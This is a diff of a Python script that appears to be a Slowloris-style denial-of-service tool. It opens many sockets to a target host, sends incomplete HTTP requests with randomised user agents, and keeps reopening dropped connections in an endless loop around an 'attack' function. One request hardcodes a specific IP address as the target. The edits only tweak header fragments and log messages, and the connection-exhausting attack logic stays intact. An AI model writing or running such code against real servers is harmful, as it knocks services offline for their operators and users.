@@ -37,21 +37,14 @@ user_agents = [
 ]
 
 request_dict = [
-    "X-a: G\r\n",
-    "H-a: G\r\n",
-    "o-a: G\r\n",
-    "s-a: G\r\n",
-    "t-a: G\r\n",
-    "a-a: G\r\n",
-    "f-a: G\r\n",
+    "X-a:",
+    "H-a:",
+    "o-a:",
+    "s-a:",
+    "t-a:",
+    "a-a:",
+    "f-a:",
 ]
-
-sync_req = "" \
-           "GET / HTTP/1.1\r\n" \
-           "Host: {}\r\n" \
-           "Content-Encoding: gzip\r\n" \
-           "Content-Type: text/html; charset=utf-8\r\n" \
-           "Keep-Alive: timeout=5, max=1000\r\n".format(HOST)
 
 sync_req1 = "GET / HTTP/1.1\r\nHost: 165.227.137.80\r\nKeep-Alive: timeout=5, max=1000\r\nUser-Agent: {0}\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9,ru;q=0.8\r\n".format(random.choice(user_agents))
 
@@ -63,7 +56,6 @@ def create_connection():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     s.connect((HOST, PORT))
-    print(sync_req1)
     try:
         s.send(sync_req1.encode("utf-8"))
     except socket.error:
@@ -88,13 +80,14 @@ def attack(s, partial_req):
 for i in range(0, NR_CONNECTIONS):
     sock = create_connection()
     connection_pull.append(sock)
+    print(i)
 
 
 while True:
     print(NR_CONNECTIONS - len(connection_pull))
     for _ in range(0, (NR_CONNECTIONS - len(connection_pull))):
         try:
-            print("Create new connection!!!")
+            print("Recreate socket connection...")
             sock = create_connection()
             if sock:
                 connection_pull.append(sock)
